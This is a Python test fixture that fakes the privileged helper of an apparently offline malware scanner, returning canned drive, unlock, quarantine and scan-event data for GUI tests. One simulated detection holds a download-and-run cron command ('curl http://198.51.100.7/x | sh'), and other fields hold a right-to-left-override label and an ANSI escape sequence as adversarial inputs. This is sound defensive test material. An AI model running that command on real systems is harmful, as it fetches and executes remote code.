"""A stand-in for the privileged helper, for GUI tests (no root, no real drives).

It answers like the real helper: asynchronously, from another thread, with
the same shapes of data.  A scan streams status/progress/detection events
and then returns a summary.  Every call is recorded.
"""

from __future__ import annotations

import hashlib
import os
import threading
import time
from concurrent.futures import Future
from typing import Any

from offscan.protocol import RemoteError

EICAR_SHA = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"


def disks(mountpoint: str | None = None, unlocked: bool = False) -> list[dict[str, Any]]:
    luks_children = [{"id": "dm-0", "device": "/dev/mapper/offscan-sdb3", "type": "crypt", "size": 30 << 30,
                      "fstype": "ext4", "label": "fedora", "uuid": "u-3", "role": "filesystem",
                      "os": {"family": "linux", "name": "Fedora Linux 43"}, "warnings": [], "children": [],
                      "mountpoint": None, "encryption": None, "host_mounts": [], "system": False}] \
        if unlocked else []
    return [{
        "id": "sdb", "device": "/dev/sdb", "type": "disk", "size": 256 << 30, "model": "Fixture SSD",
        "vendor": "ACME", "transport": "usb", "removable": True, "readonly": False, "system": False,
        "live_medium": False,
        "volumes": [
            {"id": "sdb1", "device": "/dev/sdb1", "type": "part", "size": 100 << 30, "fstype": "ntfs",
             "label": "Windows", "uuid": "u-1", "role": "filesystem", "system": False, "host_mounts": [],
             "os": {"family": "windows", "name": "Windows 11 Pro", "version": "23H2"},
             "hibernation": {"hibernated": True},
             "warnings": [{"code": "hibernated", "message": "Windows is hibernated <b>(Fast Startup)</b>."}],
             "children": [], "mountpoint": mountpoint, "encryption": None},
            {"id": "sdb2", "device": "/dev/sdb2", "type": "part", "size": 50 << 30, "fstype": "ext4",
             "label": "data\u202eevil", "uuid": "u-2", "role": "filesystem", "system": False,
             "host_mounts": [], "os": {"family": "linux", "name": "Debian GNU/Linux 13"}, "warnings": [],
             "children": [], "mountpoint": None, "encryption": None},
            {"id": "sdb3", "device": "/dev/sdb3", "type": "part", "size": 30 << 30, "fstype": "crypto_LUKS",
             "label": None, "uuid": "u-3", "role": "luks", "system": False, "host_mounts": [], "warnings": [],
             "children": luks_children, "mountpoint": None,
             "encryption": {"kind": "luks", "version": "2", "unlocked": unlocked}},
        ]}]


class FakeHelper:
    def __init__(self, mount_dir: str, delay: float = 0.02, scan_events: list | None = None,
                 summary: dict[str, Any] | None = None):
        self.mount_dir = mount_dir
        self.delay = delay
        self.calls: list[tuple[str, dict[str, Any]]] = []
        self.running = False
        self.unlocked = False
        self.mounted: set[str] = set()
        self.scan_events = scan_events
        self.summary = summary
        self.hello = {"protocol": 1}
        self.block = threading.Event()          # set() to make calls hang (freeze tests)
        self.cancelled: set[int] = set()
        self._next = 1
        self.on_event = None

    # -- HelperClient interface ------------------------------------------------------

    def start(self, timeout: float | None = None, prefer_sudo: bool = False) -> dict[str, Any]:
        time.sleep(self.delay)
        self.running = True
        return self.hello

    def close(self, timeout: float = 120) -> None:
        self.running = False

    def submit(self, method: str, params: dict[str, Any] | None = None, on_event: Any = None):
        params = params or {}
        self.calls.append((method, params))
        job = self._next
        self._next += 1
        future: Future[Any] = Future()

        def run() -> None:
            if self.block.is_set():
                time.sleep(3)
            time.sleep(self.delay)
            try:
                if method == "scan.start":
                    result = self._scan(job, params, on_event)
                else:
                    result = self.answer(method, params)
            except RemoteError as exc:
                future.set_exception(exc)
            else:
                future.set_result(result)
        threading.Thread(target=run, daemon=True).start()
        return job, future

    def call(self, method: str, params: dict[str, Any] | None = None, timeout: float | None = None,
             on_event: Any = None) -> Any:
        return self.submit(method, params, on_event)[1].result(timeout)

    def call_async(self, method: str, params: dict[str, Any] | None, callback: Any, on_event: Any = None) -> int:
        job, future = self.submit(method, params, on_event)

        def done(fut: Future[Any]) -> None:
            exc = fut.exception()
            callback(None if exc else fut.result(), exc)
        future.add_done_callback(done)
        return job

    def cancel(self, job: int) -> None:
        self.cancelled.add(job)

    # -- answers -------------------------------------------------------------------------

    def answer(self, method: str, p: dict[str, Any]) -> Any:
        if method == "helper.info":
            return {"version": "test", "scan_uid": os.getuid(), "scan_gid": os.getgid()}
        if method == "drives.list":
            return {"disks": disks(self.mount_dir if "sdb1" in self.mounted else None, self.unlocked)}
        if method == "volume.unlock":
            if p["secret"] != "secret":
                raise RemoteError("not_permitted", "wrong passphrase or key")
            self.unlocked = True
            return {"volume": p["volume"], "unlocked": "dm-0"}
        if method == "volume.mount":
            self.mounted.add(p["volume"])
            return {"volume": p["volume"], "mountpoint": self.mount_dir}
        if method == "volume.unmount":
            self.mounted.discard(p["volume"])
            return None
        if method == "remedy.plan":
            if p["volume"] == "sdb1":
                return {"volume": "sdb1", "path": p.get("path"), "sha256": EICAR_SHA, "size": 68,
                        "possible": False, "reason": "Windows on this volume is hibernated"}
            return {"volume": p["volume"], "path": p.get("path"), "sha256": EICAR_SHA, "size": 68,
                    "mode": 0o100644, "possible": True, "fstype": "ext4", "needs_secret": [], "notes": [],
                    "replay_journal": False, "remounts": []}
        if method == "remedy.apply":
            if p.get("confirm") is not True:
                raise RemoteError("invalid_params", "changes need confirm: true")
            return {"action": p["action"], "path": p["path"], "volume": p["volume"], "result": "ok",
                    "sha256": p["expect_sha256"], "quarantine_id": "a" * 32 if p["action"] == "quarantine"
                    else None, "renamed": {}, "restore_errors": []}
        if method == "quarantine.list":
            return {"entries": [{"id": "b" * 32, "time": 1.7e9, "volume": "sdb2", "path": "/x/evil.exe",
                                 "size": 68, "sha256": EICAR_SHA}]}
        if method == "changes.list":
            return {"changes": [{"time": 1.7e9, "action": "quarantine", "volume": "sdb2", "path": "/x/evil.exe",
                                 "result": "ok", "sha256": EICAR_SHA, "mount": {"driver": "ext4",
                                                                                 "options": ["rw"]}}]}
        if method in ("quarantine.restore", "quarantine.purge"):
            return {"action": "restore", "path": "/x/evil.exe", "result": "ok", "restore_errors": []}
        if method in ("scan.pause", "scan.resume", "volume.lock", "session.cleanup"):
            return True
        raise RemoteError("unknown_method", method)

    def _scan(self, job: int, p: dict[str, Any], on_event: Any) -> dict[str, Any]:
        options = p["options"]
        events = self.scan_events if self.scan_events is not None else default_events(options["volumes"][0])
        for name, data in events:
            if job in self.cancelled:
                break
            if on_event is not None:
                on_event(name, data, job)
            time.sleep(self.delay)
        now = time.time()
        summary = {"job": job, "state": "cancelled" if job in self.cancelled else "finished", "started": now - 5,
                   "finished": now, "files_scanned": 120, "bytes_scanned": 1 << 20, "files_skipped": 3,
                   "errors": 1, "detections": 3, "inventory": 1, "engines": {}, "error_samples": [],
                   "volumes": [], "message": "", "checks": {}}
        summary.update(self.summary or {})
        return summary


def default_events(volume: str) -> list[tuple[str, Any]]:
    det = {"volume": volume, "engine": "hash", "signature": "Offscan.SelfTest.EICAR.sha256", "severity": "high",
           "sha256": EICAR_SHA, "size": 68, "source": "selftest", "category": "test", "details": {},
           "path": "/home/user/eicar.com"}
    persistence = {"volume": volume, "engine": "persistence", "signature": "Scheduled command (root)",
                   "severity": "high", "path": "/etc/cron.d/backup", "category": "linux.cron",
                   "details": {"check": "linux.cron", "location": "/etc/cron.d/backup:1",
                               "value": "curl http://198.51.100.7/x | sh", "reasons": ["downloads and runs"],
                               "mitre": "T1053.003", "target": None, "fingerprint": "f" * 64}}
    registry = {"volume": volume, "engine": "persistence", "signature": "Autostart entry \"Updater\"",
                "severity": "medium", "path": "/Windows/System32/config/SOFTWARE", "category": "windows.run_key",
                "details": {"check": "windows.run_key", "location": "HKLM\\...\\Run : Updater",
                            "value": "C:\\Users\\Public\\u.exe", "reasons": [], "fingerprint": "e" * 64}}
    info = {"volume": volume, "engine": "persistence", "signature": "System unit ok.service (enabled)",
            "severity": "info", "path": "/etc/systemd/system/ok.service", "category": "linux.systemd",
            "details": {"check": "linux.systemd", "location": "/etc/systemd/system/ok.service : ExecStart",
                        "value": "/usr/bin/true", "fingerprint": "d" * 64}}
    return [
        ("scan.status", {"phase": "persistence", "message": "Checking autostart entries…"}),
        ("scan.detection", persistence), ("scan.detection", registry), ("scan.detection", info),
        ("scan.status", {"phase": "scanning", "message": "Scanning…"}),
        ("scan.progress", {"files_done": 60, "files_total": 120, "bytes_done": 1 << 19, "rate_files": 30.0,
                           "rate_bytes": 1 << 18, "eta": 2, "elapsed": 2.0, "errors": 0, "detections": 2,
                           "current": f"{volume}:/home/user/\x1b[31mred", "paused": False}),
        ("scan.detection", det),
        ("scan.progress", {"files_done": 120, "files_total": 120, "bytes_done": 1 << 20, "rate_files": 30.0,
                           "rate_bytes": 1 << 18, "eta": 0, "elapsed": 4.0, "errors": 1, "detections": 3,
                           "current": "", "paused": False}),
    ]


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()
